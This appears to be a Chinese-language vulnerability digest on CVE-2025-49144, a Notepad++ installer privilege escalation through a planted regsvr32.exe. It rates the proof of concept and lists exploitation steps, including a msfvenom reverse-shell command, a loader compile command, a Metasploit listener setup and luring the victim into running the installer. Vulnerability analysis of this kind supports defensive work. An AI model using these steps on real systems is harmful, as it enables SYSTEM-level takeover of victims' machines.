## CVE-2025-49144 - Notepad++ 权限提升 (Privilege Escalation)

**漏洞编号:** CVE-2025-49144

**漏洞类型:** 权限提升 (Privilege Escalation)

**影响应用:** Notepad++

**危害等级:** 高危

**CVSS评分:** Awaiting Analysis

**影响版本:** v8.8.1及更早版本

**利用条件:** 需要本地访问权限，攻击者需将恶意文件放置在与Notepad++安装程序相同的目录中，并诱导用户运行合法安装程序。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

POC有效性分析：
该POC代码提供了一个针对Notepad++ v8.8.1及更早版本安装程序的本地权限提升漏洞（CVE-2025-49144）的完整且详细的利用示例。POC的有效性基于其对Windows操作系统可执行文件搜索路径行为的精确理解和利用。当Notepad++安装程序在没有指定完整路径的情况下调用`regsvr32.exe`时，Windows会按照预设的优先级搜索该可执行文件，其中包括安装程序所在的当前目录。攻击者正是利用这一点，将一个恶意的`regsvr32.exe`放置在合法安装程序旁边，诱使系统在以SYSTEM权限运行安装程序时，加载并执行恶意版本。POC中提供了生成Meterpreter shellcode、编译恶意`regsvr32.exe`的C语言源代码和编译指令，以及设置Metasploit监听器的详细步骤。其清晰的文字说明进一步增强了POC的可理解性和复现性。POC明确指出，为了演示效果，建议使用Notepad++ v8.6.8版本，并可能需要暂时禁用Windows Defender。这些说明不仅没有削弱POC的有效性，反而体现了其在真实环境中的操作考量，使得研究人员能够更顺利地复现漏洞。从提供的POC内容来看，它具备高度的可靠性和可操作性，能够成功演示并实现对受害者系统的SYSTEM级权限控制。

利用步骤：
1.  **准备恶意载荷**：攻击者首先使用`msfvenom`工具生成一个针对Windows x64架构的Meterpreter反向TCP shellcode。例如，`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f c > shellcode.txt`。
2.  **定制加载器**：下载POC提供的`regsvr32_loader.c`源代码文件，并将上一步生成的完整shellcode粘贴到C文件中指定的注释位置。
3.  **编译恶意可执行文件**：使用交叉编译器（例如`x86_64-w64-mingw32-gcc`）将修改后的`regsvr32_loader.c`编译成名为`regsvr32.exe`的恶意可执行文件。例如，`x86_64-w64-mingw32-gcc regsvr32_loader.c -o regsvr32.exe -mwindows`。
4.  **设置监听器**：在攻击者的控制机器上，启动`msfconsole`并配置一个`exploit/multi/handler`监听器，设置与shellcode匹配的`payload` (windows/x64/meterpreter/reverse_tcp) 和`LHOST`/`LPORT`，等待来自受害者的反向连接。
5.  **部署恶意文件**：攻击者需要通过社会工程学或其他方式，将编译好的恶意`regsvr32.exe`文件与一个存在漏洞的Notepad++安装程序（例如v8.6.8或v8.8.1及更早版本）一同放置在受害者的机器上的同一目录中，通常是“下载”文件夹。
6.  **诱导受害者执行**：诱使受害者执行该目录下的合法Notepad++安装程序。
7.  **权限提升**：当安装程序启动并以SYSTEM权限运行，并且尝试调用`regsvr32.exe`时，由于未指定完整路径，Windows系统会优先从当前目录加载恶意`regsvr32.exe`。恶意程序随即执行其中嵌入的shellcode，从而在攻击者的监听器上建立一个NT AUTHORITY\SYSTEM级别的Meterpreter会话，完成权限提升。

投毒风险分析：
对该POC代码的投毒风险评估为低风险，约为10%。主要原因如下：首先，POC的核心组件`regsvr32_loader.c`以透明的C语言源代码形式提供，代码逻辑清晰可见，其主要功能是加载并执行用户嵌入的shellcode。这排除了代码中隐藏未知恶意功能或后门的风险。其次，POC的利用流程明确要求研究人员自行生成渗透测试所需的shellcode（例如通过`msfvenom`），并手动将其注入到C代码中，然后进行编译。这意味着研究人员对最终生成的`regsvr32.exe`文件的内容具有完全的控制权和可知性。在整个过程中，没有发现任何试图下载额外可执行文件、连接可疑外部资源、混淆代码或进行其他未经声明的恶意行为的迹象。POC中提及在测试时可能需要禁用Windows Defender，这是在安全研究和漏洞复现过程中常见的操作，旨在确保复现环境的纯净性，并非POC本身具有恶意绕过安全软件的功能。因此，对于专业的防御性安全研究人员而言，在受控的沙箱环境中，遵循POC提供的详细步骤进行复现，并使用自行生成的、已知的测试用载荷，该POC代码本身不会引入额外的、意外的系统“投毒”风险。研究人员可以完全掌控实验过程，确保研究的安全性。

**项目地址:** N/A

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-49144
